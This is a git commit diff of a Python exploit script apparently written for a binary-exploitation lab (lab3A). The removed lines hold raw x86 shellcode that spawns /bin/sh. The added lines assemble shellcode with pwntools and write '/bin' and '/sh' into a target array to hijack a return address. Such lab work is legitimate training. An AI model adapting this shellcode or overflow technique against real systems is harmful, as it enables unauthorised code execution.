0dfbb2db8ada247babf9a02a05a2475e7ae23eb4
Kamil Frankowicz <fumfi.255@gmail.com>
2018-01-15 11:50:59 +0100

    Update lab3a_new.py

--- lab3a_new.py
+++ lab3a_new.py
@@ -1,18 +1,48 @@
 #!/usr/bin/python2.7
+from pwn import *
+import binascii
 import struct
-import subprocess
+context(arch ='i386', os ='linux')
 
-BIN_SH = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68\x2f\x74\x74\x79\x68\x2f\x64\x65\x76\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
-RET_ADDR = "\x00\xF4\xFF\xBF"
-BIN_PATH = "/levels/lab03/lab3A"
+def string_to_int(string):
+    return str(int(string[::-1].encode('hex'), 16))
 
-shellcode = []
+def build_shellcode():
 
-for i in xrange(0, len(BIN_SH), 4):
-    chunk = BIN_SH[i:i+4]
-    value = struct.unpack("<L", chunk)[0]
-    shellcode.append(value)
+	sh = [
+	    "pop esi",  
+	    "pop ecx",  
+	    "pop ecx", 
+	    "pop eax",  
+	    "push esi",
+	    "push ecx",
+	    "mov  ebx, esp",
+	    "mov ecx, edi",
+	    "mov edx, edi",
+	    "int  0x80"
+	]
 
-p = subprocess.Popen([BIN_PATH], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	shellcode = ''
 
-print shellcode
+	for instr in sh:
+	    shellcode += asm(instr)
+
+	return shellcode
+
+print "store"
+print str(int(0xBFFFF58C))
+print "109"
+
+print "store"
+string_to_int('/sh')
+print "110"
+
+print "store"
+print string_to_int("/bin")
+print "112"
+
+print "store"
+print "11"
+print "113"
+
+print "quit" + build_shellcode()
